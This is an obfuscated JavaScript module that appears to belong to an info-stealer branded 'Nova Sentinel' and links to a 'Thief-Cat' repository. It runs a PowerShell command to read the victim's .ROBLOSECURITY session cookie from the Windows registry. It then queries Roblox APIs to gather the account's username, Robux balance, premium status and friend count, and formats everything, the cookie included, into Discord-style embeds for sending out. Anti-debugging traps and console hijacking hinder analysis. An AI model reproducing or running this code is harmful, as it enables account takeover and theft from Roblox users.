const _0x4571fa = (function () {
    let _0x23d0f3 = true
    return function (_0x49ae2d, _0x148696) {
      const _0x674108 = _0x23d0f3
        ? function () {
            if (_0x148696) {
              const _0x149ad4 = _0x148696.apply(_0x49ae2d, arguments)
              return (_0x148696 = null), _0x149ad4
            }
          }
        : function () {}
      return (_0x23d0f3 = false), _0x674108
    }
  })(),
  _0x3da965 = _0x4571fa(this, function () {
    return _0x3da965
      .toString()
      .search('(((.+)+)+)+$')
      .toString()
      .constructor(_0x3da965)
      .search('(((.+)+)+)+$')
  })
_0x3da965()
const _0x343acf = (function () {
  let _0x56b83e = true
  return function (_0x46854d, _0x12eb29) {
    const _0x3ec0b0 = _0x56b83e
      ? function () {
          if (_0x12eb29) {
            const _0xa9ae2a = _0x12eb29.apply(_0x46854d, arguments)
            return (_0x12eb29 = null), _0xa9ae2a
          }
        }
      : function () {}
    return (_0x56b83e = false), _0x3ec0b0
  }
})()
;(function () {
  _0x343acf(this, function () {
    const _0x159ff7 = new RegExp('function *\\( *\\)'),
      _0x4403f8 = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i')
    const _0x11ba92 = _0x563870('init')
    !_0x159ff7.test(_0x11ba92 + 'chain') || !_0x4403f8.test(_0x11ba92 + 'input')
      ? _0x11ba92('0')
      : _0x563870()
  })()
})()
const _0x3d715f = (function () {
    let _0x5358a2 = true
    return function (_0x5cb258, _0x1f6a8f) {
      const _0x3eb150 = _0x5358a2
        ? function () {
            if (_0x1f6a8f) {
              const _0x1ce824 = _0x1f6a8f.apply(_0x5cb258, arguments)
              return (_0x1f6a8f = null), _0x1ce824
            }
          }
        : function () {}
      return (_0x5358a2 = false), _0x3eb150
    }
  })(),
  _0x2a6ef7 = _0x3d715f(this, function () {
    const _0xa3894c = function () {
        let _0x4f06b0
        try {
          _0x4f06b0 = Function(
            'return (function() {}.constructor("return this")( ));'
          )()
        } catch (_0x3ba497) {
          _0x4f06b0 = window
        }
        return _0x4f06b0
      },
      _0x2d91d2 = _0xa3894c(),
      _0x1938f7 = (_0x2d91d2.console = _0x2d91d2.console || {})
    const _0x1791ca = [
      'log',
      'warn',
      'info',
      'error',
      'exception',
      'table',
      'trace',
    ]
    for (let _0x1399e2 = 0; _0x1399e2 < _0x1791ca.length; _0x1399e2++) {
      const _0x2dac98 = _0x3d715f.constructor.prototype.bind(_0x3d715f),
        _0x3d0151 = _0x1791ca[_0x1399e2],
        _0x47dfa5 = _0x1938f7[_0x3d0151] || _0x2dac98
      _0x2dac98['__proto__'] = _0x3d715f.bind(_0x3d715f)
      _0x2dac98.toString = _0x47dfa5.toString.bind(_0x47dfa5)
      _0x1938f7[_0x3d0151] = _0x2dac98
    }
  })
_0x2a6ef7()
const { execSync: _0x284ef1 } = require('child_process')
const { stat: _0x2feba7 } = require('./stats'),
  _0x15d732 = require('axios')
function _0x302a88(_0x251575) {
  if (_0x251575 != 'yes') {
    return
  }
  try {
    function _0x3276b0(_0x5ed7ce) {
      try {
        const _0x53624b =
          'powershell Get-ItemPropertyValue -Path ' +
          _0x5ed7ce +
          ':SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY'
        return _0x284ef1(_0x53624b, _0x586461).toString().trim()
      } catch (_0x20bf51) {
        return null
      }
    }
    const _0xf6b7ee = _0x3276b0('HKLM') || _0x3276b0('HKCU')
    _0xf6b7ee && roblox_cookies.push(_0xf6b7ee)
    roblox_cookies.length > 0 &&
      roblox_cookies.includes('.ROBLOSECURITY') &&
        _0x2feba7.AddRoblox(roblox_cookies)
  } catch (_0x9f741e) {}
}
async function _0x504d43(_0x54305f) {
  if (_0x54305f !== 'yes') {
    return
  }
  const _0x5a55a8 = new Set()
  const _0x2fc217 = {
    maxRedirects: 0,
    validateStatus: function (_0x3d8bc2) {
      return (_0x3d8bc2 >= 200 && _0x3d8bc2 < 300) || _0x3d8bc2 === 302
    },
  }
  try {
    const _0x1f847f = _0x2feba7.roblox_cookies.map(async (_0x2b935f) => {
      const [_0x4a3e61, _0xf41517] = await Promise.all([
        _0x15d732.get('https://www.roblox.com/mobileapi/userinfo', {
          headers: { Cookie: '.ROBLOSECURITY=' + _0x2b935f },
          ..._0x2fc217,
        }),
        _0x15d732.get('https://friends.roblox.com/v1/my/friends/count', {
          headers: { Cookie: '.ROBLOSECURITY=' + _0x2b935f },
          ..._0x2fc217,
        }),
      ])
      if (_0x4a3e61.status === 200 && _0xf41517.status === 200) {
        const {
            UserName: _0x51101d,
            RobuxBalance: _0x35e3bf,
            ThumbnailUrl: _0x1e2695,
            IsAnyBuildersClubMember: _0x342b4a,
            IsPremium: _0x564a2c,
          } = _0x4a3e61.data,
          { count: _0x246b7a } = _0xf41517.data
        if (!_0x5a55a8.has(_0x51101d)) {
          _0x5a55a8.add(_0x51101d)
          const _0x29149b = {
            UserName: _0x51101d,
            RobuxBalance: _0x35e3bf,
            ThumbnailUrl: _0x1e2695,
            IsAnyBuildersClubMember: _0x342b4a,
            IsPremium: _0x564a2c,
            friendscount: _0x246b7a,
            cookies: _0x2b935f,
          }
          _0x2feba7.detailRoblox(_0x29149b)
        }
      }
    })
    await Promise.all(_0x1f847f)
  } catch (_0x47b5f0) {}
}
async function _0x91546a(_0x196b35) {
  if (_0x196b35 != 'yes') {
    return
  }
  let _0x101554 = _0x2feba7.roblox_account
  if (_0x101554.length < 1) {
    return
  }
  return _0x101554
}
function _0x3244a7(_0x264899) {
  var _0x5d1d0f = ''
  _0x5d1d0f += '{\n"content": null,\n"embeds": ['
  for (let _0x4d4b58 = 0; _0x4d4b58 < _0x264899.length; _0x4d4b58++) {
    _0x5d1d0f += _0x264899[_0x4d4b58]
    _0x4d4b58 != _0x264899.length - 1 && (_0x5d1d0f += ',\n')
  }
  return (
    (_0x5d1d0f +=
      '],\n"avatar_url": "https://raw.githubusercontent.com/FalseKSCH/assets/main/novalogo3.png",\n"username": "Nova Sentinel",\n"attachments": []\n}'),
    _0x5d1d0f
  )
}
async function _0x3bf029(
  _0x18fd49,
  _0x251733,
  _0x29ed51,
  _0x3abe7c,
  _0x47c0af,
  _0x51b6c0,
  _0x131d7d
) {
  let _0x11f4d1 = {
    fields: [
      {
        name: '<:icons_atom:1132015067592933447> Name:',
        value: '```' + _0x18fd49 + '```',
        inline: false,
      },
      {
        name: '<:icons_Discord:1132015081148928042> Robux:',
        value: '```' + _0x251733 + '```',
        inline: true,
      },
      {
        name: '<:icon_infojaune:1132018007695184052> premium:',
        value: '`' + (_0x47c0af ? ':white_check_mark:' : '\u274C') + '`',
        inline: true,
      },
      {
        name: '<:icon_info:1132016835085209650> Club Member:',
        value: '`' + (_0x3abe7c ? ':white_check_mark:' : '\u274C') + '`',
        inline: true,
      },
      {
        name: '<a:inject:1130448568268881960> Cookie:',
        value: '[Cookies](' + _0x131d7d + ')',
        inline: true,
      },
    ],
    description: '`' + _0x51b6c0 + ' Friends`',
    color: 1638163,
    footer: { text: 'Nova | https://github.com/FalseKSCH/Thief-Cat' },
    title: 'Roblox Account',
    thumbnail: { url: '' + _0x29ed51 },
  }
  return JSON.stringify(_0x11f4d1)
}
module.exports = {
  NovaSentinelGetRoblox: _0x302a88,
  ParseAndSendRoblox: _0x504d43,
  sendRoblox: _0x91546a,
  embed: _0x3bf029,
  compile: _0x3244a7,
}
function _0x563870(_0x4db89f) {
  function _0x182d47(_0x571efe) {
    if (typeof _0x571efe === 'string') {
      return function (_0x325680) {}
        .constructor('while (true) {}')
        .apply('counter')
    } else {
      ;('' + _0x571efe / _0x571efe).length !== 1 || _0x571efe % 20 === 0
        ? function () {
            return true
          }
            .constructor('debugger')
            .call('action')
        : function () {
            return false
          }
            .constructor('debugger')
            .apply('stateObject')
    }
    _0x182d47(++_0x571efe)
  }
  try {
    if (_0x4db89f) {
      return _0x182d47
    } else {
      _0x182d47(0)
    }
  } catch (_0x6210cf) {}
}
